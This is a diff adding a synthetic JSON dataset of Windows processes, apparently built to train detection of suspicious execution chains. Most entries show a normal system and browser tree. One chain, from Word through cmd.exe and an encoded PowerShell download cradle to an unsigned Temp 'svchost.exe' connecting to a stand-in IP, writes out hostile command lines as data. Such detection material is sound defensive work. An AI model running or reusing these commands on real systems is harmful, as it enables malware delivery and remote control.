@@ -1,0 +1,186 @@
+{
+  "metadata": {
+    "title": "Windows Süreç Envanteri ve Hiyerarşi Veri Kümesi",
+    "description": "Process Explorer süreç ağacı, meşru karmaşık ağaçlar ve şüpheli yürütme zincirleri (G031-SC1 & SC2)",
+    "total_processes": 16,
+    "created_at": "2026-10-27T08:00:00Z"
+  },
+  "processes": [
+    {
+      "pid": 4,
+      "ppid": 0,
+      "name": "System",
+      "path": "ntoskrnl.exe",
+      "command_line": "",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "is_verified_signature": true,
+      "signer": "Microsoft Windows Component Publisher",
+      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+    },
+    {
+      "pid": 340,
+      "ppid": 4,
+      "name": "smss.exe",
+      "path": "C:\\Windows\\System32\\smss.exe",
+      "command_line": "\\SystemRoot\\System32\\smss.exe",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "is_verified_signature": true,
+      "signer": "Microsoft Windows",
+      "sha256": "1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f809"
+    },
+    {
+      "pid": 520,
+      "ppid": 340,
+      "name": "wininit.exe",
+      "path": "C:\\Windows\\System32\\wininit.exe",
+      "command_line": "wininit.exe",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "is_verified_signature": true,
+      "signer": "Microsoft Windows",
+      "sha256": "2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a"
+    },
+    {
+      "pid": 610,
+      "ppid": 520,
+      "name": "services.exe",
+      "path": "C:\\Windows\\System32\\services.exe",
+      "command_line": "C:\\Windows\\system32\\services.exe",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "is_verified_signature": true,
+      "signer": "Microsoft Windows",
+      "sha256": "3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b"
+    },
+    {
+      "pid": 620,
+      "ppid": 520,
+      "name": "lsass.exe",
+      "path": "C:\\Windows\\System32\\lsass.exe",
+      "command_line": "C:\\Windows\\system32\\lsass.exe",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "is_verified_signature": true,
+      "signer": "Microsoft Windows",
+      "sha256": "4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c"
+    },
+    {
+      "pid": 780,
+      "ppid": 610,
+      "name": "svchost.exe",
+      "path": "C:\\Windows\\System32\\svchost.exe",
+      "command_line": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p",
+      "user": "NT AUTHORITY\\SYSTEM",
+      "is_verified_signature": true,
+      "signer": "Microsoft Windows",
+      "sha256": "5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d"
+    },
+    {
+      "pid": 790,
+      "ppid": 610,
+      "name": "svchost.exe",
+      "path": "C:\\Windows\\System32\\svchost.exe",
+      "command_line": "C:\\Windows\\system32\\svchost.exe -k RPCSS",
+      "user": "NT AUTHORITY\\NETWORK SERVICE",
+      "is_verified_signature": true,
+      "signer": "Microsoft Windows",
+      "sha256": "5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d"
+    },
+    {
+      "pid": 1040,
+      "ppid": 520,
+      "name": "explorer.exe",
+      "path": "C:\\Windows\\explorer.exe",
+      "command_line": "C:\\Windows\\Explorer.EXE",
+      "user": "SEC-CORP\\analyst",
+      "is_verified_signature": true,
+      "signer": "Microsoft Windows",
+      "sha256": "6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e"
+    },
+    {
+      "pid": 2100,
+      "ppid": 1040,
+      "name": "chrome.exe",
+      "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
+      "user": "SEC-CORP\\analyst",
+      "is_verified_signature": true,
+      "signer": "Google LLC",
+      "sha256": "708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f"
+    },
+    {
+      "pid": 2110,
+      "ppid": 2100,
+      "name": "chrome.exe",
+      "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=gpu-process",
+      "user": "SEC-CORP\\analyst",
+      "is_verified_signature": true,
+      "signer": "Google LLC",
+      "sha256": "708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f"
+    },
+    {
+      "pid": 2120,
+      "ppid": 2100,
+      "name": "chrome.exe",
+      "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer",
+      "user": "SEC-CORP\\analyst",
+      "is_verified_signature": true,
+      "signer": "Google LLC",
+      "sha256": "708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f"
+    },
+    {
+      "pid": 2130,
+      "ppid": 2100,
+      "name": "chrome.exe",
+      "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "command_line": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=utility",
+      "user": "SEC-CORP\\analyst",
+      "is_verified_signature": true,
+      "signer": "Google LLC",
+      "sha256": "708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f"
+    },
+    {
+      "pid": 3100,
+      "ppid": 1040,
+      "name": "winword.exe",
+      "path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"invoice.docx\"",
+      "user": "SEC-CORP\\analyst",
+      "is_verified_signature": true,
+      "signer": "Microsoft Corporation",
+      "sha256": "8192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f70"
+    },
+    {
+      "pid": 3150,
+      "ppid": 3100,
+      "name": "cmd.exe",
+      "path": "C:\\Windows\\System32\\cmd.exe",
+      "command_line": "cmd.exe /c start /b powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA...",
+      "user": "SEC-CORP\\analyst",
+      "is_verified_signature": true,
+      "signer": "Microsoft Windows",
+      "sha256": "92a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f7081"
+    },
+    {
+      "pid": 3160,
+      "ppid": 3150,
+      "name": "powershell.exe",
+      "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA...",
+      "user": "SEC-CORP\\analyst",
+      "is_verified_signature": true,
+      "signer": "Microsoft Windows",
+      "sha256": "a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192"
+    },
+    {
+      "pid": 4050,
+      "ppid": 3160,
+      "name": "svchost.exe",
+      "path": "C:\\Users\\analyst\\AppData\\Local\\Temp\\svchost.exe",
+      "command_line": "C:\\Users\\analyst\\AppData\\Local\\Temp\\svchost.exe -connect 198.51.100.24:443",
+      "user": "SEC-CORP\\analyst",
+      "is_verified_signature": false,
+      "signer": "Unsigned",
+      "sha256": "b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3"
+    }
+  ]
+}
